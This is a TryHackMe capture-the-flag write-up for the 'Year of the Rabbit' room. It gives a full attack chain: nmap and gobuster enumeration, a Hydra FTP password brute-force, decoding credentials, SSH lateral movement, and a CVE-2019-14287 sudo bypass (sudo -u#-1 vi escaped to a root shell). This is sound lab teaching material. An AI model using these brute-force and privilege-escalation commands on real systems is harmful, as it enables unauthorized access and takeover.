# 🐇 Year of the Rabbit — TryHackMe Writeup

**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** CTF / Linux Privilege Escalation
**Tags:** `nmap` `gobuster` `ftp` `steganography` `strings` `brainfuck` `hydra` `ssh` `lateral-movement` `sudo-exploit`

---

## Overview

A Monty Python-themed CTF with intentional rabbit holes designed to throw you off track. The attack chain involves web enumeration with a hidden CSS clue, image steganography using `strings`, FTP brute-forcing with Hydra, decoding Brainfuck-encoded credentials, lateral movement between two users, and finally a sudo version exploit for root. Expect misdirection — that's the point of the room.

---

## Reconnaissance

### Nmap — Port Scanning

```bash
nmap -sC -sV -oN nmap_rabbit.txt <TARGET_IP>
```

**Flags explained:**
- `-sC` — Default NSE script scan
- `-sV` — Service and version detection
- `-oN` — Save output to file

**Results:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5
80/tcp open  http    Apache httpd 2.4.10 (Debian)
```

---

## Web Enumeration

### Default Apache Page

Navigate to `http://<TARGET_IP>` — you'll see the default Apache page. Nothing obvious in the source.

### Directory Brute-Force with Gobuster

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40 -o gobuster_rabbit.txt
```

**Key finding:**
```
/assets    (Status: 200)
```

Navigate to `/assets` — you'll find two files: `RickRolled.mp4` and `style.css`.

### The Hidden Clue in style.css

Open `style.css` — it contains a comment pointing to a hidden PHP page:

```
/sup3r_s3cr3t_fl4g.php
```

Navigate to `http://<TARGET_IP>/sup3r_s3cr3t_fl4g.php` — you'll get a message telling you to **turn off JavaScript**. Disable JS in your browser settings and reload.

With JS disabled, the page redirects you to a URL containing an image file: `Hot_Babe.png`. Download it.

```bash
wget http://<TARGET_IP>/assets/Hot_Babe.png
```

---

## Steganography — strings on the Image

Steghide extraction fails on this image. Use `strings` instead to extract human-readable content:

```bash
strings Hot_Babe.png
```

Scroll through the output — near the bottom you'll find:

```
Eh, you've earned this. Username: ftpuser
One of these is the password:
<list of potential passwords>
```

Save the password list to a file:

```bash
strings Hot_Babe.png | grep -A 100 "One of these" | tail -n +2 > ftp_passwords.txt
```

Or manually copy the password list from the `strings` output into a `passwords.txt` file.

---

## FTP Brute-Force with Hydra

```bash
hydra -l ftpuser -P passwords.txt ftp://<TARGET_IP> -t 4 -V
```

**Flags explained:**
- `-l ftpuser` — Single username
- `-P passwords.txt` — Password wordlist (the list from the image)
- `-t 4` — 4 threads (keep low for FTP stability)
- `-V` — Verbose, show each attempt

Once Hydra finds the password, log in:

```bash
ftp ftpuser@<TARGET_IP>
```

List and download the only file on the server:

```bash
ls
get Eli's_Creds.txt
bye
```

---

## Brainfuck Decoding

Open the file:

```bash
cat "Eli's_Creds.txt"
```

The content looks like gibberish — it's encoded in **Brainfuck**, an esoteric programming language.

Decode it using an online decoder:

```
https://www.dcode.fr/brainfuck-language
```

Paste the Brainfuck code and decode. The output reveals:
- **Username:** `eli`
- **Password:** (decoded string)

---

## Initial Access — SSH as eli

```bash
ssh eli@<TARGET_IP>
```

On login, you'll see a **message of the day (MOTD)** hinting at a hidden secret:

```
Check out our leet s3cr3t hiding place!
```

---

## Finding the Secret

Search for the hidden location:

```bash
find / -name "s3cr3t" 2>/dev/null
```

**Found:**
```
/usr/games/s3cr3t
```

Read the file inside:

```bash
ls /usr/games/s3cr3t
cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\!
```

The message reveals a **password for user gwendoline**.

---

## Lateral Movement — SSH as gwendoline

```bash
su gwendoline
```

Or switch via SSH:

```bash
ssh gwendoline@<TARGET_IP>
```

---

## User Flag

```bash
cat /home/gwendoline/user.txt
```

User flag captured. ✅

---

## Privilege Escalation — sudo Version Exploit

### Check Sudo Permissions

```bash
sudo -l
```

**Output:**
```
(ALL, !root) NOPASSWD: /usr/bin/vi
```

This means gwendoline can run `vi` as **any user except root directly**. This looks restrictive — but it's vulnerable.

### Check sudo Version

```bash
sudo -V
```

If the version is **< 1.8.28**, it's vulnerable to **CVE-2019-14287** — a bypass that allows running commands as root even when explicitly excluded.

### Exploit CVE-2019-14287

The trick: use user ID `-1` (or `4294967295`), which sudo interprets as root:

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

This opens vi as root. From inside vi, escape to a root shell:

```
:!/bin/bash
```

You now have a **root shell**. ✅

---

## Root Flag

```bash
cat /root/root.txt
```

Root flag captured. ✅

---

## Summary

| Step | Technique | Tool |
|------|-----------|------|
| Reconnaissance | Port scan | Nmap |
| Web enumeration | Directory brute-force | Gobuster |
| Hidden clue | CSS stylesheet inspection | Browser |
| Credential discovery | strings on PNG image | strings |
| FTP access | Password brute-force | Hydra |
| Credential decoding | Brainfuck decode | dcode.fr |
| Initial access | SSH login as eli | ssh |
| Secret discovery | find command + hidden file | find |
| Lateral movement | SSH as gwendoline | su / ssh |
| Privilege escalation | CVE-2019-14287 sudo bypass | sudo -u#-1 |

---

## Key Takeaways

- **Red herrings are intentional** — the room is designed to waste your time; stay methodical
- **strings** is a simpler and often more effective alternative to steghide for extracting text from images
- **Brainfuck** is an esoteric language that appears in CTFs — bookmark `dcode.fr` for fast decoding
- **CVE-2019-14287** shows that `(ALL, !root)` sudo restrictions are not always secure — version matters
- Hidden files starting with `.` (dot) in unusual directories are worth hunting with `find` after gaining a shell
- Lateral movement between users is a common real-world pattern — always check all user home directories

---

*Room link: https://tryhackme.com/room/yearoftherabbit*
